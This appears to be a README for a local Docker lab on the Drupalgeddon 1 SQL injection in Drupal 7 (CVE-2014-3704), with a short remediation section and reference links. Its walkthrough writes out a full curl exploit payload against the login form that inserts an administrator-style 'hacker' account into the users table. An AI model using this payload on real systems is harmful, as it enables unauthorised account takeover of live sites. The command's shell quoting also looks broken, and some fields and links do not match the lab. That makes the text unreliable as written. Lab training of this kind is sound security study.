# Drupal 7 Database Form API SQL Injection (Drupalgeddon 1, CVE-2014-3704)

## Overview

Drupal 7 core contains an SQL injection vulnerability in the database abstraction API. In Drupal 7.0 through 7.31, when queries use expansion of placeholder arrays, the database layer fails to properly sanitize array keys supplied in HTTP POST form arrays. Attackers can submit crafted associative arrays to inject arbitrary SQL statements, creating administrative accounts or executing PHP code.

- **Service Access**: `http://localhost:8166/`
- **Default Credentials**: `Unauthenticated SQL injection`
- **Docker Shortcut**: `./lab start drupalgeddon1`
- **Container Name**: `cyberlab_02_drupalgeddon1`
- **RAM Footprint**: ~60M

---

## Exploitation Walkthrough

### 1. Inspect Drupal 7 Homepage

```bash
curl -i http://localhost:8166/
```

### 2. Send Nested Array Payload to Login Form

```bash
curl -i -X POST 'http://localhost:8166/?q=node&destination=node' \
  -d 'name[0%20;INSERT+INTO+users+(name,pass,status)+VALUES+(\'hacker\',\'$S$DkZa6tluzZ0whqMVI8wuNzIxMTkyNDAy\',1);#]=test&name[0]=test&pass=shit&form_build_id=&form_id=user_login_block&op=Log+in'
```

### 3. Verify SQL Injection Execution

```bash
# User account 'hacker' is inserted into the users table.
```

---

## Defensive Remediation & Hardening

1. Upgrade Drupal to version 7.32 or newer.
2. Validate that placeholder arrays only contain trusted scalar keys in custom database queries.

---

## Video Walkthroughs & Technical References

- [Sqli Labs Master Lesson 1 Get Error Based Solution](https://www.youtube.com/watch?v=HtdGLZOuXXA)
- [Drupal Security Advisory SA-CORE-2014-005 (CVE-2014-3704)](https://www.drupal.org/SA-CORE-2014-005)
- [Vulhub Drupalgeddon 1 Environment](https://vulhub.org/#/environments/drupal/CVE-2014-3704/)
